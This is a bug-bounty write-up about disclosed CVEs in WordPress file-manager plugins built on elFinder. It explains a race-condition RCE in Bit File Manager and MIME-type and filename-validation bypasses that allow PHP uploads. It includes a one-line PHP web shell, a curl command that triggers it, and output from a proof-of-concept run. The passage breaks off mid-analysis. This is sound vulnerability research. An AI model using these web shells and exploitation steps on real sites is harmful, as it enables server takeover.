# How I Found My First Vulnerabilities In 6 Different WordPress Plugins (Part 2)

## Overview

Welcome to the second and the final part of this writeup! [Previously](https://siunam321.github.io/ctf/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/), I mentioned I found 7 vulnerabilities in WordPress plugin "[Bit Form](https://wordpress.org/plugins/bit-form/)", 1 of which was duplicated. In this part, I'll share some **common misconfiguration/mistakes in PHP library "[elFinder](https://github.com/Studio-42/elFinder)"**, which ultimately led me to find **15+ vulnerabilities across 5 plugins** that use the same PHP library.

<details><summary><strong>List of Vulnerabilities</strong></summary>

| CVE ID | Plugin Name | Vulnerability Title & Record Link |
|--------|-------------|-----------------------------------|
| [CVE-2024-7627](https://www.cve.org/CVERecord?id=CVE-2024-7627) | [Bit File Manager](https://wordpress.org/plugins/file-manager/) | [Unauthenticated Remote Code Execution via Race Condition](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-manager/bit-file-manager-60-655-unauthenticated-remote-code-execution-via-race-condition) |
| [CVE-2024-7770](https://www.cve.org/CVERecord?id=CVE-2024-7770) | [Bit File Manager](https://wordpress.org/plugins/file-manager/) | [Authenticated (Subscriber+) Arbitrary File Upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-manager/bit-file-manager-100-free-open-source-file-manager-and-code-editor-for-wordpress-655-authenticated-subscriber-arbitrary-file-upload) |
| [CVE-2024-8743](https://www.cve.org/CVERecord?id=CVE-2024-8743) | [Bit File Manager](https://wordpress.org/plugins/file-manager/) | [Authenticated (Subscriber+) Limited JavaScript File Upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-manager/bit-file-manager-100-free-open-source-file-manager-and-code-editor-for-wordpress-657-authenticated-subscriber-limited-javascript-file-upload) |
| [CVE-2024-7559](https://www.cve.org/CVERecord?id=CVE-2024-7559) | [File Manager Pro](https://filemanagerpro.io/file-manager-pro/) | [Authenticated (Subscriber+) Arbitrary File Upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-file-manager-pro/file-manager-pro-837-authenticated-subscriber-arbitrary-file-upload) |
| [CVE-2024-8918](https://www.cve.org/CVERecord?id=CVE-2024-8918) | [File Manager Pro](https://filemanagerpro.io/file-manager-pro/) | [Unauthenticated Limited JavaScript File Upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-file-manager-pro/file-manager-pro-839-unauthenticated-limited-javascript-file-upload) |
| [CVE-2024-8507](https://www.cve.org/CVERecord?id=CVE-2024-8507) | [File Manager Pro](https://filemanagerpro.io/file-manager-pro/) | [Cross-Site Request Forgery to Arbitrary File Upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-file-manager-pro/file-manager-pro-839-cross-site-request-forgery-to-arbitrary-file-upload) |
| [CVE-2024-8746](https://www.cve.org/CVERecord?id=CVE-2024-8746) | [File Manager Pro](https://filemanagerpro.io/file-manager-pro/) | [Unauthenticated Backup File Download and Upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-file-manager-pro/file-manager-pro-839-unauthenticated-backup-file-download-and-upload) |
| [CVE-2024-8126](https://www.cve.org/CVERecord?id=CVE-2024-8126) | [Advanced File Manager](https://wordpress.org/plugins/file-manager-advanced/) | [Authenticated (Subscriber+) Arbitrary File Upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-manager-advanced/advanced-file-manager-528-authenticated-subscriber-arbitrary-file-upload) |
| [CVE-2024-13333](https://www.cve.org/CVERecord?id=CVE-2024-13333) | [Advanced File Manager](https://wordpress.org/plugins/file-manager-advanced/) | [Advanced File Manager 5.2.12 - 5.2.13 - Authenticated (Subscriber+) Arbitrary File Upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-manager-advanced/advanced-file-manager-5212-5213-authenticated-subscriber-arbitrary-file-upload) |
| [CVE-2024-8725](https://www.cve.org/CVERecord?id=CVE-2024-8725) | [Advanced File Manager](https://wordpress.org/plugins/file-manager-advanced/) | [Authenticated (Subscriber+) Limited File Upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-manager-advanced/advanced-file-manager-528-authenticated-subscriber-limited-file-upload) |
| [CVE-2024-8704](https://www.cve.org/CVERecord?id=CVE-2024-8704) | [Advanced File Manager](https://wordpress.org/plugins/file-manager-advanced/) | [Authenticated (Administrator+) Local JavaScript File Inclusion via fma_locale](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-manager-advanced/advanced-file-manager-528-authenticated-administrator-local-javascript-file-inclusion-via-fma-locale) |
| [CVE-2024-7985](https://www.cve.org/CVERecord?id=CVE-2024-7985) | [FileOrganizer](https://wordpress.org/plugins/fileorganizer/) | [Authenticated (Subscriber+) Arbitrary File Upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/fileorganizer/fileorganizer-109-authenticated-subscriber-arbitrary-file-upload) |
| [CVE-2024-11010](https://www.cve.org/CVERecord?id=CVE-2024-11010) | [FileOrganizer](https://wordpress.org/plugins/fileorganizer/) | [Authenticated (Administrator+) Local JavaScript File Inclusion](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/fileorganizer/fileorganizer-114-authenticated-administrator-local-javascript-file-inclusion) |
| [CVE-2024-8066](https://www.cve.org/CVERecord?id=CVE-2024-8066) | [Filester](https://wordpress.org/plugins/filester/) | [Authenticated (Subscriber+) Arbitrary File Upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/filester/file-manager-pro-filester-184-authenticated-subscriber-arbitrary-file-upload) |
| [CVE-2024-9669](https://www.cve.org/CVERecord?id=CVE-2024-9669) | [Filester](https://wordpress.org/plugins/filester/) | [Authenticated (Administrator+) Local JavaScript File Inclusion](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/filester/file-manager-pro-filester-185-authenticated-administrator-local-javascript-file-inclusion) |

</details>

> Note: Some reports are still in triage, I'll update the vulnerability list after public disclosure.

Since many vulnerabilities share the exact same class of vulnerability and exploitation method, I'll only cover the following vulnerability classes and an unique vulnerability:
- Server-side vulnerabilities
    1. RCE via race condition (Bit File Manager only)
    2. Arbitrary file upload
- Client-side vulnerabilities
    1. Local JavaScript file inclusion
    2. Limited file upload (CSS injection and JavaScript files overwrite)

> Note: For Bit File Manager's RCE via race condition, [István Márton](https://www.wordfence.com/blog/author/istvanwf/) has written a writeup about this vulnerability. Feel free to check it out: [20,000 WordPress Sites Affected by Remote Code Execution Vulnerability in Bit File Manager WordPress Plugin](https://www.wordfence.com/blog/2024/09/20000-wordpress-sites-affected-by-remote-code-execution-vulnerability-in-bit-file-manager-wordpress-plugin/).

Without further ado, let's dive in!

## Flawed/Missing Permission Check - [Bit File Manager: RCE via Race Condition](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-manager/bit-file-manager-60-655-unauthenticated-remote-code-execution-via-race-condition)

After I found many vulnerabilities in plugin "Bit Form", I have this thought: "If I can find tons of vulnerabilities in this plugin, **surely this vendor's plugins should also have a very similar code pattern**, right?"

With this thought in mind, I started to dig deeper into different plugins that are developed by the vendor, [Bit Apps](https://bitapps.pro/). Eventually, I found plugin "[Bit File Manager](https://wordpress.org/plugins/file-manager/)" is very interesting to me, as this plugin allows users to upload and edit files. Maybe I can find some high severity vulnerabilities like arbitrary file upload?

> Best File manager and Code editor plugin for WordPress. You can edit, upload, delete, copy, move, rename, archive and extract files with the file manager plugin. You don’t need to worry about FTP anymore. It is really simple and easy to use. - [https://wordpress.org/plugins/file-manager/#description](https://wordpress.org/plugins/file-manager/#description)

As usual, I used the "[sources and sinks model](https://www.youtube.com/watch?v=ZaOtY4i5w_U)" to find vulnerabilities. Eventually, I found out there's a OS command injection sink [`exec`](https://www.php.net/manual/en/function.exec.php) in class `FileEditValidator` method `checkSyntax`:

```php
class FileEditValidator
{
    [...]
    public function checkSyntax($content)
    {
        [...]
        if (!\function_exists('exec')) {
            [...]
        } else {
            $tempFilePath   = FM_UPLOAD_BASE_DIR . 'temp.php';
            $fp             = fopen($tempFilePath, 'w+');
            fwrite($fp, $content);
            fclose($fp);
            exec('php -l ' . escapeshellarg($tempFilePath), $output, $return);
            [...]
        }
        [...]
    }
}
```

At the first glance, this `exec` function call did escape the OS command argument correctly using function [`escapeshellarg`](https://www.php.net/manual/en/function.escapeshellarg.php). As the method name suggested, it uses OS command `php -l <filename_here>` to check for PHP syntax:

```shell
└> php --help
[...]
  -l               Syntax check only (lint)
```

Hmm... Maybe it's vulnerable to argument injection? We could inject our own arguments to maybe achieve RCE. Wait a minute... We can't even control the source, `$tempFilePath`, it's just this: `FM_UPLOAD_BASE_DIR . 'temp.php'`.

Uhh... What's that constant variable `FM_UPLOAD_BASE_DIR`'s value?

`file-manager/backend/config/app.php`:

```php
// Upload dir path
if (!\defined('FM_WP_UPLOAD_DIR')) {
    \define('FM_WP_UPLOAD_DIR', wp_upload_dir());
}
[...]
// File manager upload dir basedir
\defined('FM_UPLOAD_BASE_DIR') || \define('FM_UPLOAD_BASE_DIR', FM_WP_UPLOAD_DIR['basedir'] . DS . 'file-manager');
```

In here, if constant `FM_UPLOAD_BASE_DIR` is not defined, the value will be the base WordPress upload directory. By default, it should be something like `/var/www/html/wp-content/uploads`. Therefore, **`$tempFilePath` value is `/var/www/html/wp-content/uploads/file-managertemp.php`**. (Yes, it's indeed missing a `/` character, so the temporary filename is `file-managertemp.php`)

Well, since **`wp-content/uploads/file-managertemp.php` is in the webroot directory**, we can directly access this temporary file without any issues. With that said, if we can control the `$content` that's going to be written into that temporary file, we can **execute arbitrary PHP code**.

After checking the file's PHP syntax, it'll actually delete the temporary file via function [`unlink`](https://www.php.net/manual/en/function.unlink.php):

```php
class FileEditValidator
{
    [...]
    public function checkSyntax($content)
    {
        [...]
        if (!\function_exists('exec')) {
            [...]
        } else {
            [...]
            exec('php -l ' . escapeshellarg($tempFilePath), $output, $return);

            $errorMessages = [];
            foreach ($output as $result) {
                [...]
            }
            
            unlink($tempFilePath);
            [...]
        }
        [...]
    }
}
```

Hmm... Is it over?!? We can't access that temporary file after it's been deleted, right?? Fortunately, since the temporary file is already written into `wp-content/uploads/file-managertemp.php`, we can try to **win the race window between the file write and the file deletion**.

To do so, we can:
1. Keep writing the temporary file
2. Keep accessing the temporary file

If we're lucky, we can access the temporary file before its deletion.

After deleting the temporary file, this method also have some checks, such as checking if the user has `install_plugins` capability or not:

```php
class FileEditValidator
{
    [...]
    public function checkSyntax($content)
    {
        [...]
        if (!\function_exists('exec')) {
            [...]
        } else {
            [...]
        }
        
        if (\defined('BFM_DISABLE_SYNTAX_CHECK') && BFM_DISABLE_SYNTAX_CHECK) {
            return;
        }

        if (!empty($error) && !Capabilities::check('install_plugins')) {
            throw new PreCommandException(esc_html($error));
        }
    }
}
```

Well, it doesn't even matter anymore, the temporary file is already written, so those checks are basically useless. Hence, if we can control the `$content` of the temporary file, we can achieve RCE via race condition.

Now the question is: "Where does this method `checkSyntax` is being called?" If we scroll up a little bit, we can see a method called **`validate`**:

```php
class FileEditValidator
{
    public function validate($cmd, &$args, $elfinder, $volume)
    {
        try {
            $this->checkPermission();
        } catch (PreCommandException $th) {
            return $th->getError();
        }

        $args['content'] = stripcslashes($args['content']); // Default wordpress slashing removed.

        // Checking syntax for PHP file.
        if (strpos($args['content'], '<?php') !== false) {
            try {
                $this->checkSyntax($args['content']);
            } catch (PreCommandException $th) {
                return $th->getError();
            }
        }
    }
}
```

As you can see, if `$args['content']` **contains the string `<?php`**, it'll call method `checkSyntax`. But before it does that, it first calls method **`checkPermission`**:

```php
class FileEditValidator
{
    [...]
    private function checkPermission()
    {
        $error = '';
        if (\defined('DISALLOW_FILE_EDIT') && DISALLOW_FILE_EDIT) {
            $error = __('File edit is disabled. To allow edit, please set DISALLOW_FILE_EDIT to false in wp-config file', 'file-manager');
        }

        if (\is_null($error) && !Plugin::instance()->permissions()->currentUserCanRun('edit')) {
            $error = __('Not Authorized to edit file', 'file-manager');
        }

        if (!empty($error)) {
            throw new PreCommandException(esc_html($error));
        }
    }
}
```

In this method, the first if statement checks if constant variable `DISALLOW_FILE_EDIT` is defined and the value is `true`. If it is, set `$error` to the error message string.

In the second if statement, **if `$error` is `null`** and the current user has permission to run command `edit` (I'll explain what's that command later on.), it'll set `$error` to the error message string.

Did you catch that? If `$error` is `null`. If you look at this method, **the `$error` is never going to be `null`**. If it's not `null`, the AND (`&&`) operator will just return `false` even if method `currentUserCanRun` returns `true`.

How about the final if statement? If `$error` is not empty, it throws exception `PreCommandException`. Again, if we passed the first if statement, `$error` will not be empty!

Therefore, **this `checkPermission` method is essentially useless**. Which means if we can call method `validate`, we can exploit the race condition vulnerability!

Again, tracing back the call stack, this method is used in... here??

```php
final class FileManagerController
{
    [...]
    public function getFinderOptions()
    {
        $finderOptions = new Options(is_user_logged_in() && \defined('WP_DEBUG') && WP_DEBUG);

        $finderOptions->setBind(
            'put.pre',
            [
                Plugin::instance()->fileEditValidator(),
                'validate',
            ]
        );
        [...]
    }
    [...]
}
```

In class `Options` method `setBind`, it's a setter to set the command type to be method `validate` from class `FileEditValidator`:

```php
class Options
{
    [...]
    public function setBind($commandType, callable $callback)
    {
        $this->_bind[$commandType] = $callback;

        return $this;
    }
    [...]
}
```

After some digging into the source code, I found that this plugin is using a PHP library called [elFinder](https://github.com/Studio-42/elFinder).

> elFinder is an open-source file manager for web, written in JavaScript using jQuery UI. Creation is inspired by simplicity and convenience of Finder program used in Mac OS X operating system. - [https://github.com/Studio-42/elFinder](https://github.com/Studio-42/elFinder)

In elFinder, the developer who uses this library can register different callbacks for user action via using [bind](https://github.com/Studio-42/elFinder/wiki/Connector-configuration-options-2.1#bind). If we look at [elFinder's command list](https://github.com/Studio-42/elFinder/wiki/Client-Server-API-2.1#command-list), there are lots of commands that the client (The user) can send. For instance, if the client sends command "[ls](https://github.com/Studio-42/elFinder/wiki/Client-Server-API-2.1#wiki-ls)", the connector, the application which runs on the server (server-side), executes the given command and returns the result to the client.

In our case, the developers binded action `put.pre` to the `validate` method callback. If the action has appended with `.pre`, the callback will be called **before** the command is executed. Therefore, when we send command "[put](https://github.com/Studio-42/elFinder/wiki/Client-Server-API-2.1#wiki-put)", **elFinder connector will first execute the binded callback** and then execute command "put".

Ok... How does this `getFinderOptions` method is being called? If we trace back the call stack again, we can see this `connector` method from class `FileManagerController`:

```php
final class FileManagerController
{
    /**
     * File Manager connector function
     *
     * @throws Exception
     */
    public function connector()
    {
        try {
            Plugin::instance()->accessControl()->checkPermission(sanitize_key($_REQUEST['cmd']));
            $finderProvider = new FileManagerProvider($this->getFinderOptions());
            $finderProvider->getFinder()->run();
        } catch (Exception $th) {
            // phpcs:ignore
            echo wp_json_encode(['error' => $th->getMessage()]);
        }

        wp_die();
    }
```

Let's go through the first one, method `checkPermission` from class `AccessControlProvider`. As the method name suggested, it checks we have permission to use the command (Request parameter `cmd`) or not. Luckily, I noticed a **programming error** in this method. Let's see if you can notice it:

```php
class AccessControlProvider
{
    [...]
    public function checkPermission($command, ...$args)
    {
        $error              = 'Assume $error is NOT empty';
        [...]
        if (!empty($error)) {
            try {
                throw new PreCommandException($error);
            } catch (PreCommandException $th) {
                return $th->getError();
            }
        }
    }
}
```

Quick question: Will the next line in method `connector` get executed after calling method `checkPermission`?

The answer is... Yes, method `connector` will continue its execution **even though if an exception is thrown in method `checkPermission`**. This is because when exception `PreCommandException` is thrown, the try catch statement caught the exception and **return the exception message**. Therefore, the execution will be continued after calling this method. Btw, this isn't because PHP doing weird stuff, this behavior can also been seen in other programming languages, like Python.

With that said, **method `checkPermission` is, just like `checkPermission` from class `FileEditValidator`, obsolete**. (Did you notice the coding pattern? :D)

After calling method `checkPermission`, method `connector` will create a new object instance from class `FileManagerProvider` and passing the elFinder options to the `__constructor` magic method:

```php
class FileManagerProvider
{
    /**
     * Options for elFinder
     *
     * @var FinderOptions
     */
    private $_finderOptions;

    public function __construct(FinderOptions $finderOptions)
    {
        $this->_finderOptions = $finderOptions;
    }

    public function getFinder()
    {
        $finder = new elFinder($this->_finderOptions->getOptions());

        return new FinderConnector($finder);
    }
}
```

Finally, method `getFinder` from that class will create a new `elFinder` object instance with all elFinder options, and call method `run` from class `elFinder` to execute elFinder the given command (Request parameter `cmd`):

```php
final class FileManagerController
{
    [...]
    public function connector()
    {
        try {
            [...]
            $finderProvider = new FileManagerProvider($this->getFinderOptions());
            $finderProvider->getFinder()->run();
        } catch (Exception $th) {
            [...]
        }
        [...]
    }
}
```

Therefore, in order to exploit the RCE via race condition vulnerability, we need to **send elFinder command `put`**.

Huh... How can I call this `connector` method?

After a lot of time digging in the source code, I realized that Bit Apps has developed a full-blown library called [WPKit](https://github.com/Bit-Apps-Pro/wp-kit), which I assume it's a wrapper for many different WordPress functions? I didn't dive into this one, as the code base is quite big.

Eventually, we can found this file: `file-manager/backend/hooks/ajax.php`, which registers different AJAX actions:

```php
use BitApps\WPKit\Http\Router\Route;
[...]
Route::group(
    function () {
        Route::match(['get', 'post'], 'connector', [FileManagerController::class, 'connector']);
        [...]
    }
)->middleware('nonce:admin');

Route::noAuth()
    ->match(['get', 'post'], 'connector_front', [FileManagerController::class, 'connector'])
    ->middleware('nonce:public');
```

In here, we can see that there are 2 AJAX actions that has the callback method `connector` from class `FileManagerController`: AJAX **action `connector` for file manager in the admin page** (`/wp-admin/admin.php?page=file-manager`), and **action `connector_front` for the shortcode file manager**. In action `connector_front`, this action is registered with the **`wp_ajax_nopriv_` prefix**, which means this action can be used **without being unauthenticated**.

Notice that both of those actions requires a nonce. For action `connector_front`, the nonce is created via method `filterConfigVariable` from class `Shortcode`:

```php
class Shortcode
{
    public function __construct()
    {
        Hooks::addAction('wp_enqueue_scripts', [$this, 'registerAssets']);
        SWrapper::addShortcode('file-manager', [$this, 'shortCodeView']);
        Hooks::addFilter(Config::withPrefix('localized_script'), [$this, 'filterConfigVariable']);
    }

    public function filterConfigVariable($config)
    {
        [...]
        return (array) $config + [
            'action'  => Config::withPrefix('connector_front'),
            'nonce'   => wp_create_nonce(Config::withPrefix('public_nonce')),
            'options' => $options,
        ];
    }
}
```

Welp, looks like we need to create shortcode `file-manager` (Registered via static method `SWrapper::addShortcode`). Damn, I thought this vulnerability can be achieved without authentication. Now we need at least mid-level privilege ("Author", "Contributor", and "Editor"), or the WordPress site already has shortcode `file-manager` setup. (Or is it? :D)

Turns out, this plugin allows administrator to allow non-authenticated (Guess) user to access the shortcode in the "Permissions" page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250204154524.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250204154619.png)

Unfortunally, the permissions setting has proper implementation, like validating the nonce

By setting up the guess user access and the shortcode, we as an unauthenticated user can get the nonce:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250204154809.png)

Ok... To sum up, in order to exploit this unauthenticated RCE via race condition vulnerability, we need to:
- Prerequisite: Guess user access and shortcode `file-manager` must already been setup by the adminsitrator
- Steps:
    1. Get a valid nonce in from shortcode page/post
    2. Keep editing a random file via elFinder command `put` with content that contains `<?php` and whatever PHP code we want to execute
    3. Keep accessing the temporary file at path `wp-content/uploads/file-managertemp.php`
    4. Profit!

To automate the above steps, I published a Proof-of-Concept Python script on my GitHub repository [CVE-2024-7627 PoC](https://github.com/siunam321/CVE-2024-7627-PoC):

```shell
└> python3 poc.py
[*] Getting a valid AJAX nonce...
[+] Found the valid AJAX nonce: f3128b289e
[*] Getting a random file's hash via elFinder command "open"...
[+] Found file "wp-config-sample.php" with hash "l1_d3AtY29uZmlnLXNhbXBsZS5waHA"!
[*] Editing file with hash "l1_d3AtY29uZmlnLXNhbXBsZS5waHA" via elFinder command "put" and getting the edited temporary PHP file at "http://localhost/wp-content/uploads/file-managertemp.php"...
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[-] Failed to read the edited temporary PHP file in time
[+] We won the race condition! Here's the PHP payload result:
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
8d3b2776e8a6
```

## Arbitrary File Upload

### Flawed/Missing MIME Type Checking - [Bit File Manager](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-manager/bit-file-manager-100-free-open-source-file-manager-and-code-editor-for-wordpress-655-authenticated-subscriber-arbitrary-file-upload)

After reporting that vulnerability, it's also time to find another vulnerability! Since elFinder has command "[upload](https://github.com/Studio-42/elFinder/wiki/Client-Server-API-2.1#upload)", we can try to upload PHP files!

But before we do that, we need to setup file manager access to role "Subscriber" and enable elFinder command "upload" to test this command:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108105839.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108105853.png)

> Note: The reason why we setup file manager access to role "Subscriber" is because we don't want to test the command in role "Administrator" or above. It's also because **this kind of plugin, the developers WANTS administrators to upload arbitrary files, including PHP files.** If a non-administrator user can upload arbitrary files, that's a real vulnerability.

Then, we can login as a user with role "Subscriber" and try to upload a PHP file via the previously mentioned shortcode:

```shell
┌[siunam♥Mercury]-(~/Downloads)-[2025.01.08|10:59:37(HKT)]
└> echo -n '<?php system($_GET["cmd"]); ?>' > test.php
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108110119.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108110142.png)

Ah, of course it wouldn't be that easy.

Luckily, this plugin allows administrators to allow a certain [MIME types](https://developer.mozilla.org/en-US/docs/Web/HTTP/MIME_types) to be uploaded:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108111533.png)

Hmm... What if we allow MIME types "text"? Let's try to upload the PHP file again:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108111959.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108112532.png)

```shell
└> curl --get http://localhost/wp-content/uploads/file-manager/test.php --data 'cmd=id' 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Wait, it works? Even though we allowed MIME type "text", **low and mid-level privilege users should NOT be able to upload arbitrary PHP files**, as it can lead to RCE.

Why we're allowed to upload PHP files?... Let's dive into the source code again!

If we take a closer look to method `getFinder` from class `FileManagerProvider` (It's called by the `connector` method), it'll call method `getOptions` from class `Options` to get elFinder options:

```php
class FileManagerProvider
{
    [...]
    public function getFinder()
    {
        $finder = new elFinder($this->_finderOptions->getOptions());

        return new FinderConnector($finder);
    }
}
```

```php
class Options
{
    [...]
    public function getOptions()
    {
        $options = [];
        [...]
        return $options;
    }
}
```

Since I want to take a look at the elFinder options, I'll set a breakpoint in the return statement in method `getOptions`. After doing so and resend the upload command request again, the `$options` array is like this:

```php
[
    [...]
    "binds" => [...],
    "roots" => [
        [...],
        "uploadDeny" => ["application", "audio", "chemical", "font", "image", "message", "model", "video", "x-conference"],
        "uploadAllow" => ["text"],
        [...],
    ],
    [...]
]
```

According to [elFinder's connector configuration options](https://github.com/Studio-42/elFinder/wiki/Connector-configuration-options-2.1), [uploadDeny](https://github.com/Studio-42/elFinder/wiki/Connector-configuration-options-2.1#uploaddeny) and [uploadAllow](https://github.com/Studio-42/elFinder/wiki/Connector-configuration-options-2.1#uploadallow) are an array of blacklisted and whitelisted MIME types. In our case, only MIME type "text" is allowed. We can check that in the source code.

In elFinder's method `allowPutMime` and `mimeAccepted` from class `elFinderVolumeDriver`, `$mime` is the MIME type of the uploaded file, which is obtained by PHP function `finfo_file` using method `mimetype`.

```php
abstract class elFinderVolumeDriver
{
    [...]
    public function mimeAccepted($mime, $mimes = null, $empty = true)
    {
        $mimes = is_array($mimes) ? $mimes : $this->onlyMimes;
        if (empty($mimes)) {
            return $empty;
        }
        return $mime == 'directory'
            || in_array('all', $mimes)
            || in_array('All', $mimes)
            || in_array($mime, $mimes)
            || in_array(substr($mime, 0, strpos($mime, '/')), $mimes);
    }
    [...]
    protected function allowPutMime($mime)
    {
        // logic based on http://httpd.apache.org/docs/2.2/mod/mod_authz_host.html#order
        $allow = $this->mimeAccepted($mime, $this->uploadAllow, null);
        $deny = $this->mimeAccepted($mime, $this->uploadDeny, null);
        if (strtolower($this->uploadOrder[0]) == 'allow') { // array('allow', 'deny'), default is to 'deny'
            $res = false; // default is deny
            if (!$deny && ($allow === true)) { // match only allow
                $res = true;
            }// else (both match | no match | match only deny) { deny }
        } else { // array('deny', 'allow'), default is to 'allow' - this is the default rule
            $res = true; // default is allow
            if (($deny === true) && !$allow) { // match only deny
                $res = false;
            } // else (both match | no match | match only allow) { allow }
        }
        return $res;
    }
}
```

If we use step into the first `allowPutMime` method call, and use vscode's debug console, we can see that it'll return `true`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108120317.png)

This is because the `mimeAccepted` method will also check the [type](https://developer.mozilla.org/en-US/docs/Web/HTTP/MIME_types#structure_of_a_mime_type) is matched to the allowed MIME type, which is `text`. In our case, **`text/x-php` is type of `text`**, which means it'll match the allowed MIME type. Hence, we can upload arbitrary PHP files **if** the administrators set the allow MIME type to "text".

Now that we understand one of many common elFinder misconfigurations/mistakes, let's move on to the another one!

### Flawed/Missing Filename Validation - [Advanced File Manager With Premium Add-on Advanced File Manager Shortcodes](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-manager-advanced/advanced-file-manager-528-authenticated-subscriber-arbitrary-file-upload)

Inside many different elFinder options, it has something called "[acceptedName](https://github.com/Studio-42/elFinder/wiki/Connector-configuration-options-2.1#acceptedname)". This option aims to validate the filename. For instance, the option can be set like the following:

```php
function validName($name) {
    return strpos($name, ".") !== 0;
}

$options = array(
            "roots" => array(
                array( "acceptedName" => "validName" )
            ));
$connector = new elFinderConnector(new elFinder($options));
$connector->run();
```

When a client sends an "upload" elFinder command, it'll call the `validName` callback function to validate the upload filename. In this example, if the filename starts with a `.` character, it'll return `false`, which means the filename must NOT start with a `.` character. (**`true` means valid**)

In Advanced File Manager with premium add-on Advanced File Manager Shortcodes, we can see that there are 3 AJAX action that use similar elFinder options in their respected callback method: `fma_load_shortcode_fma_secur`, `fma_render_secure_auth`, and `fma_render_secure_visitor`.

```php
class class_fma_shortcode_secure {
    [...]
    public function __construct() {
        add_action( 'wp_ajax_fma_load_shortcode_fma_secure', array(&$this, 'fma_load_shortcode_fma_ui'));
        add_action( 'wp_ajax_nopriv_fma_load_shortcode_fma_secure', array(&$this, 'fma_load_shortcode_fma_ui'));
        add_action( 'wp_ajax_fma_render_secure_auth', array(&$this, 'fma_render_secure_auth_callback'));
        add_action( 'wp_ajax_nopriv_fma_render_secure_visitor', array(&$this, 'fma_render_secure_visitor_callback'));
    }
}
```

In those callback methods, the elFinder options use the same "acceptedName" callback function `afmvalidName`:

```php
$opts = array(
    'roots' => array(
        // Items volume
        array(
            [...]
            'acceptedName' => 'afmvalidName',
            [...]
    ),
    [...]
)
[...]
$fmaconnector = new elFinderConnector(new elFinder($opts));
$fmaconnector->run();
```

Let's take a look at that "acceptedName" callback function:

```php
function afmvalidName($name) {
    if(!empty($name)) {
        $name = sanitize_file_name($name);
        if(strpos($name, '.php') || strpos($name, '.ini') || strpos($name, '.htaccess') || strpos($name, '.config')) {
            return false;
        } else {
            return strpos($name, '.') !== 0;
        }
    }
}
```

Did you notice anything weird? No? Don't worry, I'll explain.

In this function, it uses WordPress function [`sanitize_file_name`](https://developer.wordpress.org/reference/functions/sanitize_file_name/) to sanitize the filename, which is good. But it's not **always** good. In fact, using function `sanitize_file_name` in this **context** is actually causing more harm than good. In that WordPress function, it has this line:

```php
function sanitize_file_name( $filename ) {
    [...]
    $filename = trim( $filename, '.-_' );
    [...]
}
```

